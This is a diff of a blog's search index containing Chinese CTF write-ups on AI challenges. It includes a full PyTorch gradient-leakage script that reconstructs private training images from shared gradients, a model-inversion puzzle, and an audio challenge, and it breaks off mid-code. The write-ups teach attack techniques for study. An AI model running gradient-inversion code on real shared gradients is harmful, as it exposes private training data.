:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;flag: <span class="subst">&#123;x&#125;</span>: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="https://s2.loli.net/2023/11/30/rz5YT8Ai2fogaIu.png" alt=""></p>
-<p>这是仅完成的一题，剩下的是根据官方wp的思路来学习的</p>
-<p>单纯菜，qwq~~</p>
-<h2 id="network-in-network">network-in-network</h2>
-<p><strong>考点：神经网络逆向</strong></p>
-<p>先来看一下官方给的</p>
-<p><img src="https://s2.loli.net/2023/11/30/3IeufHGkZVx2Bdw.png" alt=""></p>
-<p>我再研究研究，qwq</p>
-<h2 id="H1F1">H1F1</h2>
-<p><strong>考点：音频反向</strong></p>
-<p>这道题就讲一下思路吧，不想动手复现了</p>
-<p>根据官方wp和吉大师傅的简单操作了一下</p>
-<p><a href="https://mp.weixin.qq.com/s/O14tELa2JCkhJUPA7RNfRw">2023HITCTF wp (qq.com)</a></p>
-<p>只能说学到了一个新的知识：音频diff</p>
-<p>首先根据峰值将两端音频对齐，然后对其中一段音频反向</p>
-<p>可以发现下图的怪异bit点</p>
-<p><img src="https://s2.loli.net/2023/11/30/hvCyXY5inZpN6fS.png" alt=""></p>
-<p>进行读取二进制0和1，最后转字符串就行了</p>
-<h2 id="总结">总结</h2>
-<p>都什么年代了，哪还有什么传统Misc啊（乐</p>
-<p>还有这次比赛的web也确实让人有一种脑干缺失的美</p>
-<p>出题人太懂出题了（悲</p>
-]]></content>
-      <categories>
-        <category>Writeup</category>
-      </categories>
-      <tags>
-        <tag>HITCTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2024mapnaCTF-Writeup-Forensics</title>
     <url>/2024/02/03/2024mapnaCTF-Writeup-Forensics/</url>
     <content><![CDATA[<h1>2024mapnaCTF-Writeup-Forensics</h1>
@@ -670,6 +670,90 @@
       </categories>
       <tags>
         <tag>西湖论剑</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>AI-CTF（1）Alice-AI系列</title>
+    <url>/2023/11/17/AI-CTF%EF%BC%881%EF%BC%89Alice/</url>
+    <content><![CDATA[<h1>AI-CTF（1）Alice-AI系列</h1>
+<h2 id="2022-CTF">2022*CTF</h2>
+<h3 id="Alice’s-challenge">Alice’s challenge</h3>
+<p>题目描述</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Alice and Bob decided to train a better AI model with their own data sets. However, Bob doesn’t want to show Alice all his secrets, especially his original pictures, so he only gave Alice some training gradients. But is it really safe?</span><br><span class="line">艾丽斯和鲍勃决定使用各自的数据集训练一个更好的人工智能模型。然而，鲍勃不想向艾丽斯展示他所有的机密，特别是他的原始图片，所以他只提供了一些训练梯度给艾丽斯。但这真的安全吗？</span><br></pre></td></tr></table></figure>
+<p>从提示很明显看出本题的核心就是梯度恢复数据。</p>
+<p>这是出题人给出的完整exp，现在结合<a href="https://link.zhihu.com/?target=https%3A//github.com/mit-han-lab/dlg%E5%8E%9F%E8%AE%BA%E6%96%87%E5%A4%8D%E7%8E%B0%E4%BB%A3%E7%A0%81%E6%9D%A5%E8%A7%A3%E6%9E%90%E7%90%86%E8%A7%A3%E6%96%B9%E6%B3%95%E3%80%82">https://link.zhihu.com/?target=https%3A//github.com/mit-han-lab/dlg原论文复现代码来解析理解方法。</a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">from</span> torchvision <span class="keyword">import</span> transforms</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AliceNet2</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(AliceNet2, self).__init__()</span><br><span class="line">        self.conv = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>, stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">        )</span><br><span class="line">        self.fc = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Linear(<span class="number">768</span>, <span class="number">200</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.conv(x)</span><br><span class="line">        x = x.view(x.size(<span class="number">0</span>), -<span class="number">1</span>)</span><br><span class="line">        x = self.fc(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">criterion</span>(<span class="params">pred_y, grand_y</span>):</span><br><span class="line">    <span class="comment"># This is the Cross entropy loss function</span></span><br><span class="line">    tmptensor=torch.mean(</span><br><span class="line">        torch.<span class="built_in">sum</span>(</span><br><span class="line">            - grand_y * F.log_softmax(pred_y, dim=-<span class="number">1</span>), <span class="number">1</span></span><br><span class="line">        ))</span><br><span class="line">    <span class="keyword">return</span> tmptensor</span><br><span class="line"></span><br><span class="line">ts1 = transforms.Compose([transforms.Resize(<span class="number">32</span>),transforms.CenterCrop(<span class="number">32</span>),transforms.ToTensor()])</span><br><span class="line">ts2 = transforms.ToPILImage()</span><br><span class="line"></span><br><span class="line">my_device = <span class="string">&quot;cpu&quot;</span></span><br><span class="line"><span class="keyword">if</span> torch.cuda.is_available():</span><br><span class="line">    my_device = <span class="string">&quot;cuda&quot;</span></span><br><span class="line"></span><br><span class="line">Net = torch.load(<span class="string">&#x27;./Net.model&#x27;</span>).to(my_device)</span><br><span class="line">outpath=<span class="string">&#x27;./grad/&#x27;</span></span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    original_dy_dx=dy_dx=torch.load(outpath+<span class="built_in">str</span>(i)+<span class="string">&#x27;.tensor&#x27;</span>)</span><br><span class="line">    dummy_data = torch.randn(<span class="number">1</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">32</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    dummy_label = torch.randn(<span class="number">1</span>,<span class="number">200</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    optimizer = torch.optim.LBFGS([dummy_data, dummy_label])</span><br><span class="line">    history = []</span><br><span class="line">    <span class="keyword">for</span> iters <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">closure</span>():</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            pred = Net(dummy_data)</span><br><span class="line">            dummy_onehot_label = F.softmax(dummy_label, dim=-<span class="number">1</span>)</span><br><span class="line">            dummy_loss = criterion(pred,</span><br><span class="line">                                   dummy_onehot_label)</span><br><span class="line">            dummy_dy_dx = torch.autograd.grad(dummy_loss, Net.parameters(), create_graph=<span class="literal">True</span>)</span><br><span class="line">            grad_diff = <span class="number">0</span></span><br><span class="line">            grad_count = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> gx, gy <span class="keyword">in</span> <span class="built_in">zip</span>(dummy_dy_dx, original_dy_dx):</span><br><span class="line">                grad_diff += ((gx - gy) ** <span class="number">2</span>).<span class="built_in">sum</span>()</span><br><span class="line">                grad_count += gx.nelement()</span><br><span class="line">            grad_diff.backward()</span><br><span class="line">            <span class="keyword">return</span> grad_diff</span><br><span class="line"></span><br><span class="line">        optimizer.step(closure)</span><br><span class="line">        <span class="keyword">if</span> iters % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">            current_loss = closure()</span><br><span class="line">            <span class="built_in">print</span>(iters, <span class="string">&quot;%.4f&quot;</span> % current_loss.item())</span><br><span class="line">        history.append(ts2(dummy_data[<span class="number">0</span>].cpu()))</span><br><span class="line"></span><br><span class="line">    plt.figure(figsize=(<span class="number">12</span>, <span class="number">8</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        plt.subplot(<span class="number">3</span>, <span class="number">10</span>, i + <span class="number">1</span>)</span><br><span class="line">        plt.imshow(history[i * <span class="number">10</span>])</span><br><span class="line">        plt.title(<span class="string">&quot;iter=%d&quot;</span> % (i * <span class="number">10</span>))</span><br><span class="line">        plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Dummy label is %d.&quot;</span> % torch.argmax(dummy_label, dim=-<span class="number">1</span>).item())</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure>
+<p>根据出题人给出的exp，尝试运行，但实际恢复效果却不太好？</p>
+<p>这边对每一部分代码进行解释</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AliceNet2</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(AliceNet2, self).__init__()</span><br><span class="line">        self.conv = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>, stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">        )</span><br><span class="line">        self.fc = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Linear(<span class="number">768</span>, <span class="number">200</span>)</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.conv(x)</span><br><span class="line">        x = x.view(x.size(<span class="number">0</span>), -<span class="number">1</span>)</span><br><span class="line">        x = self.fc(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">criterion</span>(<span class="params">pred_y, grand_y</span>):</span><br><span class="line">    <span class="comment"># This is the Cross entropy loss function</span></span><br><span class="line">    tmptensor=torch.mean(</span><br><span class="line">        torch.<span class="built_in">sum</span>(</span><br><span class="line">            - grand_y * F.log_softmax(pred_y, dim=-<span class="number">1</span>), <span class="number">1</span></span><br><span class="line">        ))</span><br><span class="line">    <span class="keyword">return</span> tmptensor</span><br></pre></td></tr></table></figure>
+<p>这里初识化定义了一个卷积神经网络模型LeNet，在原论文中除了LeNet网络模型，还有一种为Resnet，暂时先对这一种进行理解。序列里包含了四个卷积层，每个卷积层后面跟着一个 Sigmoid 激活函数。每个卷积层使用 5x5 的卷积核，具有不同的步长 (<code>stride</code>) 和池化(<code>padding</code>)。</p>
+<p>然后包含一个线性全连接层，输入特征数为 768（由前面的卷积层产生）和输出特征数为 200。通过这个全连接层，网络将图像的特征映射到一个 200 维的空间，通常用于图像分类及特征提取。</p>
+<p>其中forward方法定义了数据在通过模型时的前向传播过程，输入数据 <code>x</code> 经过卷积层处理，然后被拉直成一维向量，最后经过全连接层 得到最终输出。</p>
+<p>criterion 函数定义了交叉熵损失函数，用于衡量模型输出与目标标签之间的差异。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ts1 = transforms.Compose([transforms.Resize(<span class="number">32</span>),transforms.CenterCrop(<span class="number">32</span>),transforms.ToTensor()])</span><br><span class="line">ts2 = transforms.ToPILImage()</span><br></pre></td></tr></table></figure>
+<p>这里的两行主要是进行图像转换的一些操作，第一行用于图像转换为张量，第二行用于张量转换为图像，即图像的预处理和后处理。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_device = <span class="string">&quot;cpu&quot;</span></span><br><span class="line"><span class="keyword">if</span> torch.cuda.is_available():</span><br><span class="line">    my_device = <span class="string">&quot;cuda&quot;</span></span><br><span class="line"></span><br><span class="line">Net = torch.load(<span class="string">&#x27;./Net.model&#x27;</span>).to(my_device)</span><br><span class="line">outpath=<span class="string">&#x27;./grad/&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>使用计算机cuda进行计算，以及对模型和张量数据的导入处理</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">torch.manual_seed(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<p><code>torch.manual_seed(0)</code> 的作用是设置 PyTorch 中的随机数生成器的种子为 0，相同的随机数种子将产生相同的随机数序列。而在这种攻击方法中，有涉及到伪标签和伪数据的初始化，所以设置seed种子，尽可能保证生成的相似性。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    original_dy_dx=dy_dx=torch.load(outpath+<span class="built_in">str</span>(i)+<span class="string">&#x27;.tensor&#x27;</span>)</span><br><span class="line">    dummy_data = torch.randn(<span class="number">1</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">32</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    dummy_label = torch.randn(<span class="number">1</span>,<span class="number">200</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    optimizer = torch.optim.LBFGS([dummy_data, dummy_label])</span><br><span class="line">    history = []</span><br><span class="line">    <span class="keyword">for</span> iters <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">closure</span>():</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            pred = Net(dummy_data)</span><br><span class="line">            dummy_onehot_label = F.softmax(dummy_label, dim=-<span class="number">1</span>)</span><br><span class="line">            dummy_loss = criterion(pred,</span><br><span class="line">                                   dummy_onehot_label)</span><br><span class="line">            dummy_dy_dx = torch.autograd.grad(dummy_loss, Net.parameters(), create_graph=<span class="literal">True</span>)</span><br><span class="line">            grad_diff = <span class="number">0</span></span><br><span class="line">            grad_count = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> gx, gy <span class="keyword">in</span> <span class="built_in">zip</span>(dummy_dy_dx, original_dy_dx):</span><br><span class="line">                grad_diff += ((gx - gy) ** <span class="number">2</span>).<span class="built_in">sum</span>()</span><br><span class="line">                grad_count += gx.nelement()</span><br><span class="line">            grad_diff.backward()</span><br><span class="line">            <span class="keyword">return</span> grad_diff</span><br><span class="line"></span><br><span class="line">        optimizer.step(closure)</span><br><span class="line">        <span class="keyword">if</span> iters % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">            current_loss = closure()</span><br><span class="line">            <span class="built_in">print</span>(iters, <span class="string">&quot;%.4f&quot;</span> % current_loss.item())</span><br><span class="line">        history.append(ts2(dummy_data[<span class="number">0</span>].cpu()))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这一段是论文思想的核心重点就是创建dummy_data,dummy_label所得到的梯度与原始训练数据所得到的梯度的均方误差，再用损失函数对dummy_data,dummy_label最优化，不断迭代以恢复出原始数据，但是可能也就是这里存在问题，使得我实际得到的图像效果不佳，但暂时还没确定问题的原因。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.figure(figsize=(<span class="number">12</span>, <span class="number">8</span>))</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">       plt.subplot(<span class="number">3</span>, <span class="number">10</span>, i + <span class="number">1</span>)</span><br><span class="line">       plt.imshow(history[i * <span class="number">10</span>])</span><br><span class="line">       plt.title(<span class="string">&quot;iter=%d&quot;</span> % (i * <span class="number">10</span>))</span><br><span class="line">       plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;Dummy label is %d.&quot;</span> % torch.argmax(dummy_label, dim=-<span class="number">1</span>).item())</span><br><span class="line">   plt.show()</span><br></pre></td></tr></table></figure>
+<p>这一段就是将所优化后的数据进行可视化操作，以达成数据恢复的目的</p>
+<p>然后根据相关资料找了一个改进的攻击方法</p>
+]]></content>
+      <categories>
+        <category>AI</category>
+        <category>AI-CTF</category>
+      </categories>
+      <tags>
+        <tag>2022*CTF</tag>
+        <tag>AI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>AI-CTF（3）network-in-network</title>
+    <url>/2023/12/01/AI-CTF%EF%BC%883%EF%BC%89network-in-network/</url>
+    <content><![CDATA[<h1>AI-CTF（3）network-in-network</h1>
+<p>本题来自2023HITCTF，这是赛后进行的复现</p>
+<p>有被骂到，qwq~~</p>
+<p><img src="https://s2.loli.net/2023/12/01/bB4Tfy8JHpP2Nd9.png" alt=""></p>
+<p>首先来看问题代码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> transforms</span><br><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">file = Image.<span class="built_in">open</span>(<span class="string">&#x27;origin.jpg&#x27;</span>)</span><br><span class="line">trans = transforms.Compose([</span><br><span class="line">    transforms.ToTensor(),</span><br><span class="line">])</span><br><span class="line">m = trans(file)</span><br><span class="line">torch.manual_seed(<span class="number">0x2daa1a1</span>)</span><br><span class="line">net = nn.Sequential(</span><br><span class="line">    nn.Conv2d(<span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.Conv2d(<span class="number">5</span>, <span class="number">10</span>, <span class="number">5</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">    nn.Linear(<span class="number">317</span>, <span class="number">800</span>),</span><br><span class="line">    nn.Conv2d(<span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">    nn.Sigmoid()</span><br><span class="line">)</span><br><span class="line">torchvision.utils.save_image(net(m).squeeze(), <span class="string">&#x27;enc.png&#x27;</span>)</span><br><span class="line">torch.save(net, <span class="string">&#x27;net.pt&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>简单解释</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file = Image.<span class="built_in">open</span>(<span class="string">&#x27;origin.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>使用 PIL 打开一张名为 ‘origin.jpg’ 的图像。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">trans = transforms.Compose([</span><br><span class="line">    transforms.ToTensor(),</span><br><span class="line">])</span><br></pre></td></tr></table></figure>
+<p>创建一个图像转换操作的管道，将图像转换为 PyTorch 的张量（tensor）。<code>transforms.ToTensor()</code> 将图像转换为张量。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = trans(file)</span><br></pre></td></tr></table></figure>
+<p>通过上面的转换管道，将图像 ‘origin.jpg’ 转换为张量 <code>m</code>。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">torch.manual_seed(<span class="number">0x2daa1a1</span>)</span><br></pre></td></tr></table></figure>
+<p>设置 PyTorch 的随机种子，以确保结果的可重复性。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">net = nn.Sequential(</span><br><span class="line">    nn.Conv2d(<span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.Conv2d(<span class="number">5</span>, <span class="number">10</span>, <span class="number">5</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">    nn.Linear(<span class="number">317</span>, <span class="number">800</span>),</span><br><span class="line">    nn.Conv2d(<span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">    nn.Sigmoid()</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>构建一个简单的卷积神经网络（CNN）模型。该模型由以下层组成：</p>
+<ul>
+<li>一个卷积层 (<code>nn.Conv2d</code>)，输入通道数为 3，输出通道数为 5，卷积核大小为 3。</li>
+<li>一个 ReLU 激活函数 (<code>nn.ReLU</code>)。</li>
+<li>一个卷积层，输入通道数为 5，输出通道数为 10，卷积核大小为 5。</li>
+<li>一个 ReLU 激活函数。</li>
+<li>一个最大池化层 (<code>nn.MaxPool2d</code>)，池化窗口大小为 2。</li>
+<li>一个全连接层 (<code>nn.Linear</code>)，输入特征数为 317，输出特征数为 800。</li>
+<li>一个卷积层，输入通道数为 10，输出通道数为 1，卷积核大小为 1。</li>
+<li>一个 Sigmoid 激活函数 (<code>nn.Sigmoid</code>)。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">torchvision.utils.save_image(net(m).squeeze(), <span class="string">&#x27;enc.png&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>使用模型对输入图像进行处理，将处理后的张量通过 <code>squeeze()</code> 去掉维度为 1 的尺寸，然后使用 <code>torchvision.utils.save_image</code> 将处理后的图像保存为 ‘enc.png’。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">torch.save(net, <span class="string">&#x27;net.pt&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>其实，这题的重点问题模型的输出逆推。首先，是前面卷积层卷积核小，仅捕捉局部细节特征，对整体图像不会有太大影响。其次，在全连接层，将十个通道进行了归一化处理，因此我们所能得到的仅是全连接层后被均值处理后的图像。</p>
+<p>被困难卡住了，得弄明白回来补充</p>
+]]></content>
+      <categories>
+        <category>AI</category>
+        <category>AI-CTF</category>
+      </categories>
+      <tags>
+        <tag>HITCTF</tag>
+        <tag>AI</tag>
       </tags>
   </entry>
   <entry>
@@ -825,92 +909,8 @@
       </categories>
       <tags>
         <tag>香山杯</tag>
+        <tag>AI</tag>
         <tag>LeNet</tag>
-        <tag>AI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>AI-CTF（1）Alice-AI系列</title>
-    <url>/2023/11/17/AI-CTF%EF%BC%881%EF%BC%89Alice/</url>
-    <content><![CDATA[<h1>AI-CTF（1）Alice-AI系列</h1>
-<h2 id="2022-CTF">2022*CTF</h2>
-<h3 id="Alice’s-challenge">Alice’s challenge</h3>
-<p>题目描述</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Alice and Bob decided to train a better AI model with their own data sets. However, Bob doesn’t want to show Alice all his secrets, especially his original pictures, so he only gave Alice some training gradients. But is it really safe?</span><br><span class="line">艾丽斯和鲍勃决定使用各自的数据集训练一个更好的人工智能模型。然而，鲍勃不想向艾丽斯展示他所有的机密，特别是他的原始图片，所以他只提供了一些训练梯度给艾丽斯。但这真的安全吗？</span><br></pre></td></tr></table></figure>
-<p>从提示很明显看出本题的核心就是梯度恢复数据。</p>
-<p>这是出题人给出的完整exp，现在结合<a href="https://link.zhihu.com/?target=https%3A//github.com/mit-han-lab/dlg%E5%8E%9F%E8%AE%BA%E6%96%87%E5%A4%8D%E7%8E%B0%E4%BB%A3%E7%A0%81%E6%9D%A5%E8%A7%A3%E6%9E%90%E7%90%86%E8%A7%A3%E6%96%B9%E6%B3%95%E3%80%82">https://link.zhihu.com/?target=https%3A//github.com/mit-han-lab/dlg原论文复现代码来解析理解方法。</a></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">from</span> torchvision <span class="keyword">import</span> transforms</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AliceNet2</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(AliceNet2, self).__init__()</span><br><span class="line">        self.conv = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>, stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">        )</span><br><span class="line">        self.fc = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Linear(<span class="number">768</span>, <span class="number">200</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.conv(x)</span><br><span class="line">        x = x.view(x.size(<span class="number">0</span>), -<span class="number">1</span>)</span><br><span class="line">        x = self.fc(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">criterion</span>(<span class="params">pred_y, grand_y</span>):</span><br><span class="line">    <span class="comment"># This is the Cross entropy loss function</span></span><br><span class="line">    tmptensor=torch.mean(</span><br><span class="line">        torch.<span class="built_in">sum</span>(</span><br><span class="line">            - grand_y * F.log_softmax(pred_y, dim=-<span class="number">1</span>), <span class="number">1</span></span><br><span class="line">        ))</span><br><span class="line">    <span class="keyword">return</span> tmptensor</span><br><span class="line"></span><br><span class="line">ts1 = transforms.Compose([transforms.Resize(<span class="number">32</span>),transforms.CenterCrop(<span class="number">32</span>),transforms.ToTensor()])</span><br><span class="line">ts2 = transforms.ToPILImage()</span><br><span class="line"></span><br><span class="line">my_device = <span class="string">&quot;cpu&quot;</span></span><br><span class="line"><span class="keyword">if</span> torch.cuda.is_available():</span><br><span class="line">    my_device = <span class="string">&quot;cuda&quot;</span></span><br><span class="line"></span><br><span class="line">Net = torch.load(<span class="string">&#x27;./Net.model&#x27;</span>).to(my_device)</span><br><span class="line">outpath=<span class="string">&#x27;./grad/&#x27;</span></span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    original_dy_dx=dy_dx=torch.load(outpath+<span class="built_in">str</span>(i)+<span class="string">&#x27;.tensor&#x27;</span>)</span><br><span class="line">    dummy_data = torch.randn(<span class="number">1</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">32</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    dummy_label = torch.randn(<span class="number">1</span>,<span class="number">200</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    optimizer = torch.optim.LBFGS([dummy_data, dummy_label])</span><br><span class="line">    history = []</span><br><span class="line">    <span class="keyword">for</span> iters <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">closure</span>():</span><br><span class="line">            optimizer.zero_grad()</span><br><span 